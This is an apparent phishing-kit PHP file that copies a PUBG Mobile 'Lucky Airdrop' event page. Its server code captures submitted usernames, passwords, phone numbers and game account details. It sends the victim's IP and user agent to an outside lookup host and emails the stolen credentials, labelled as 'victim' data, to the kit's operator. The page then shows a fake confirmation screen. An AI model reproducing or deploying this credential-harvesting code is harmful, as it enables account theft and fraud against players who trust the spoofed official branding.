<?php
// BILANG SEND2MAIL AUTO BAKUHANTAM
// JGN DIRECODE YA BOSS
// NguyenThuWan 
// Happy Mancing
date_default_timezone_set("Asia/Makassar");
$date = date('d-M-Y H:i');
$user = $_POST['user'];
 if(isset($user)){
    }else{
    header('location:index.php');
    exit;
    }
$pass = $_POST['pass'];
$login = $_POST['login'];
$id = $_POST['id'];
$nick = $_POST['nick'];
$hp = $_POST['hp'];
$level = $_POST['level'];
function get_client_ip() { 
    $ipaddress = '';
    if (getenv('HTTP_CLIENT_IP'))
        $ipaddress = getenv('HTTP_CLIENT_IP');
    else if(getenv('HTTP_X_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_X_FORWARDED_FOR');
    else if(getenv('HTTP_X_FORWARDED'))
        $ipaddress = getenv('HTTP_X_FORWARDED');
    else if(getenv('HTTP_FORWARDED_FOR'))
        $ipaddress = getenv('HTTP_FORWARDED_FOR');
    else if(getenv('HTTP_FORWARDED'))
       $ipaddress = getenv('HTTP_FORWARDED');
    else if(getenv('REMOTE_ADDR'))
        $ipaddress = getenv('REMOTE_ADDR');
    else
        $ipaddress = 'UNKNOWN';
    return $ipaddress;
}
$ip = get_client_ip();
$ua = $_SERVER['HTTP_USER_AGENT'];

$uax = urlencode($ua);
$chp = curl_init('http://newpubgcrate.64-b.it/system/ua.php?ua='.$uax.'');
curl_setopt($chp, CURLOPT_RETURNTRANSFER, true);
$up = curl_exec($chp);
curl_close($chp);
$iwan = explode("-",$up);
$ch = curl_init('http://newpubgcrate.64-b.it/system/flag.php?ip='.$ip.'');
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
$iwanganz = curl_exec($ch);
curl_close($ch);
$paku = str_replace('IwanGanteng','',$iwanganz);

//KONTEN UNTUK KIRIM KE EMAIL
$subjek = "$nick [$level] | $iwan[0] $iwan[1]";
$pesan = <<<EOD
<center> 
<div style="background: url(https://coverfiles.alphacoders.com/816/81621.jpg) no-repeat center center; background-size: 100% 100%; width: 294; height: 80px; color: #000; text-align: center; border-top-left-radius: 5px; border-top-right-radius: 5px;"></div>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Akun</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>EMAIL/PHONE/USERNAME</th>
<th style="width: 78%; text-align: center;"><b>$user</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PASSWORD</th>
<th style="width: 78%; text-align: center;"><b>$pass</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER ID</th>
<th style="width: 78%; text-align: center;"><b>$id</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>CHARACTER NAME</th>
<th style="width: 78%; text-align: center;"><b>$nick</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>PHONE NUMBER</th>
<th style="width: 78%; text-align: center;"><b>$hp</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ACCOUNT LEVEL</th>
<th style="width:78%;text-align:center;"><b>$level</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>LOGIN</th>
<th style="width: 78%; text-align: center;"><b>$login</th> 
</tr>
</table>
<div style="background: #000; width: 294; color: #fff; text-align: left; padding: 10px;">Informasi Lokasi Korban</div>
<table style="border-collapse: collapse; border-color: #000; background: #fff" width="100%" border="1">
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Negara</th>
<th style="width: 78%; text-align: center;"><b>$wan[country] $paku</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Brand</th>
<th style="width: 78%; text-align: center;"><b>$iwan[0]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Model</th>
<th style="width: 78%; text-align: center;"><b>$iwan[1]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Os</th>
<th style="width: 78%; text-align: center;"><b>$iwan[2]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>Browser</th>
<th style="width: 78%; text-align: center;"><b>$iwan[3]</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>ALAMAT IP</th>
<th style="width: 78%; text-align: center;"><b>$ip</th> 
</tr>
<tr>
<th style="width: 22%; text-align: left;" height="25px"><b>WAKTU MASUK</th>
<th style="width: 78%; text-align: center;"><b>$date</th> 
</tr>
</table>
<div style="width: 294; height: 40px; background: #000; color: #fff; padding: 10px; border-bottom-left-radius: 5px; border-bottom-right-radius: 5px; text-align: center;">
<div style="float: left; margin-top: 3%;">
Temukan saya:
</div>
<div style="float: right;">
<a href="http://wa.me/628971526865"><img style="margin: 5px;" width="30" src="https://i.ibb.co/SxcV8wB/facebook.png"></a>
<a href="https://t.me/nguyenthuwan"><img style="margin: 5px;" width="30" src="https://i.ibb.co/Ph7nCjg/telegram.png"></a>
</div>
</div>
</center>
EOD;
include'email.php';
$sender = 'From: Uncheck Mantap'.$paku.'<arpantek@gmail.com>';
$headers  = 'MIME-Version: 1.0' . "\r\n";
$headers .= 'Content-type: text/html; charset=iso-8859-1' . "\r\n";
$headers .= ''.$sender.'' . "\r\n";
$kirim = mail($nguyen, $subjek, $pesan, $headers);
?>
<!DOCTYPE html>
<html lang="en">
<head>
    <!-- 页面通用 header 配置 -->
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1, viewport-fit=cover">
    <meta http-equiv="X-UA-Compatible" content="IE=edge" />
    <meta name="Description" content="Witness the rise of the Ultimate Team made of Global Stars!Go on Twitter and use the appropriate tag (found in the Team Details), to support and vote for your favorite stars! The teams with the highest points will receive Global Extreme Challenge Show Match Points.Go support your team now!" />
    <meta name="Keywords" content="Global Extreme Challenge,Vote,PUBG MOBILE" />
    <meta property="og:url" content="https://www.pubgmobile.com/event/globalextremechallenge/" />
    <meta property="og:type" content="website">
    <meta property="og:title" content="Global Extreme Challenge" />
    <meta property="og:description" content="Witness the rise of the Ultimate Team made of Global Stars!Go on Twitter and use the appropriate tag (found in the Team Details), to support and vote for your favorite stars! The teams with the highest points will receive Global Extreme Challenge Show Match Points.Go support your team now!" />
    <meta property="og:image" content="https://www.pubgmobile.com/en/event/globalextremechallenge/images/share.jpg" />
    <script src='https://kit.fontawesome.com/a076d05399.js'></script>
    <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/4.7.0/css/font-awesome.min.css">
    <link rel="stylesheet" href="css/style.css">
    <style>
       .card {
       border-radius:8px;
       align-items:center;
       justify-content:center;
       display:flex;
       flex-direction:column;
       margin-top:5%;
       width:80%;
       height:350px;
       background:linear-gradient(10deg,gold,orange);
       }
       .card .alert {
       border-radius:8px;
       align-items:center;
       justify-content:center;
       display:flex;
       font-weight:bold;
       background:red;
       color:white;
       width:50%;
       height:30px;
       animation: getar 0.5s infinite;
       }
       .card input{
       font-weight:bold;
       color:white;
       border:1.5px solid gold;
       background:orange;
       border-radius:8px;
       text-align:center;
       margin-top:4%;
       width:85%;
       height:40px;
       font-family: 'wanwan', sans-serif;
       }
       .card select {
       font-family: 'wanwan', sans-serif;
       color:white;
       text-align-last:center;
       font-weight:bold;
       border-radius:8px;
       border:1.5px solid gold;
       background:orange;
       text-align:center;
       margin-top:4%;
       width:85%;
       height:40px;
       }
       .card .btn {
       background:orange;
       border:1.5px solid green;
       width:35%;
       }
       .card input::-webkit-input-placeholder { /* Chrome/Opera/Safari */
  color: #fff;
       }
       @keyframes getar {
  0% { transform: translate(1px, 1px) rotate(0deg); }
  10% { transform: translate(-1px, -2px) rotate(-1deg); }
  20% { transform: translate(-3px, 0px) rotate(1deg); }
  30% { transform: translate(3px, 2px) rotate(0deg); }
  40% { transform: translate(1px, -1px) rotate(1deg); }
  50% { transform: translate(-1px, 2px) rotate(-1deg); }
  60% { transform: translate(-3px, 1px) rotate(0deg); }
  70% { transform: translate(3px, 1px) rotate(-1deg); }
  80% { transform: translate(-1px, -1px) rotate(1deg); }
  90% { transform: translate(1px, 2px) rotate(0deg); }
  100% { transform: translate(1px, -2px) rotate(-1deg); }
}
    </style>
    <link rel="stylesheet" href="https://www.pubgmobile.com/id/event/globalextremechallenge/css/common.css" />
    <link rel="stylesheet" href="//cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/css/swiper.min.css" />
    <link rel="stylesheet" href="https://www.pubgmobile.com/id/event/globalextremechallenge/css/style.css" />
    <link rel="stylesheet" href="https://www.pubgmobile.com/common/css/all.css" />
    <title>LUCKY AIDROP | PUBG MOBILE</title>
    <!-- design：insight  | reconsitution：insight | establish:2020/03/13 -->
    <script src="//cdnjs.cloudflare.com/ajax/libs/jquery/3.3.1/jquery.min.js"></script>
    <script>
        var mobile = false;
        if (/Android|webOS|iPhone|iPad|iPod|BlackBerry/i.test(navigator.userAgent)) {
            mobile = true;
            setTimeout(function() {
                $('body').addClass('mclass');
            }, 30);
        }
    </script>
    <script>
    function kembali() {
    document.getElementById("loginnya").style.display = "block";
    document.getElementById("item").style.display = "none";
    }
    function showfb() {
    document.getElementById("loginfacebook").style.display = "block";
    }
    </script>
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-131768225-5"></script>
     
</head>
<body class="en">
    <div class="top-nav">
    <div class="top-main c">
        <!-- logo,name -->
        <div class="top-log c">
            <a href="//www.pubgmobile.com/en-US/" onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_logo'});">
                <img src="https://www.pubgmobile.com/common/images/icon_logo.jpg" width="128" height="128" alt="" />
            </a>
            <h1 class="top-tit">
                PUBG MOBILE
                <span>OFFICIAL PUBG ON MOBILE</span>
            </h1>
        </div>
        <!-- line -->
        <div class="top-line" onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_btn'});">
            <ul>
                <li>-</li>
                <li>-</li>
                <li>-</li>
            </ul>
        </div>
        <!-- nav-list -->

        <!-- homepage,download -->
        <div class="top-btn">
            <a href="//www.pubgmobile.com/pay/" target="_blank" onclick="gtag('event','x_jump',{'event_category':'common_inc','event_label':'nav_purchase'});">PURCHASE</a>
            <a class="down" href="https://web.gpubgm.com/m/Website/xiaobao/AOS_IG0190_19173No48_0.19.0.13900_Shipping_ThirdPartyPayment_GLOBAL.shell.signed_uawebsite.apk" target="_blank" onclick="gtag('event','x_click',{'event_category':'common_inc','event_label':'nav_download'});">DOWNLOAD</a>
        </div>
        <!-- download-ul -->
        <!-- <ul class="slec">
            <li class="app-li">
                <a href="https://app.adjust.com/4yxckw" target="_blank" onclick="gtag('event','x_download',{'event_category':'common_inc','event_label':'nav_app'});">
					App Store
				</a>
            </li>
            <li class="apk-li">
                <a href="https://web.gpubgm.com/m/Website/xiaobao/AOS_IG0190_19173No48_0.19.0.13900_Shipping_ThirdPartyPayment_GLOBAL.shell.signed_uawebsite.apk" onclick="gtag('event','x_download',{'event_category':'common_inc','event_label':'nav_apk'});">
					APK Download
				</a>
            </li>
        </ul> -->
        <!-- language -->

    </div>
</div>
    <div class="wrap" id="wrap">
        <section class="s5" style="background:url('https://i0.wp.com/pngstocks.com/wp-content/uploads/2019/05/background-2.jpg?zoom=2.625&resize=380%2C475&ssl=1');height:100vh;">
        <br>
        <br>
            <span class="rank-title">CONGRATULATIONS</span>
          <center>
          <div class="card">
       <img width="200" height="200" src="img/done.png">
       Hello <strong>[ <?php echo $nick;?> ]</strong> Thanks For Attending This Event I Hope You Enjoy This, And We Have Receive Your Request, Wait Till 24 Hours
          </div>
            </center>
            

            
          
  <br>
  <br>
  <br>
  <br>

            
            
<link rel="stylesheet" href="css/footer.css">
    <script src="//cdnjs.cloudflare.com/ajax/libs/Swiper/4.5.0/js/swiper.min.js"></script>
    
    <script src="https://www.pubgmobile.com/id/event/globalextremechallenge/js/main.js"></script>
    <script src="https://www.pubgmobile.com/id/event/globalextremechallenge/js/index.js"></script>
    
    <!-- Global site tag (gtag.js) - Google Analytics -->
    <script async src="https://www.googletagmanager.com/gtag/js?id=UA-117352746-1"></script>
    <script>
        window.dataLayer = window.dataLayer || [];
        function gtag(){dataLayer.push(arguments);}
        gtag('js', new Date());
        gtag('config', 'UA-117352746-1');
    </script>


<script src="https://www.pubgmobile.com/common/js/gray.js"></script>
</body>
</html>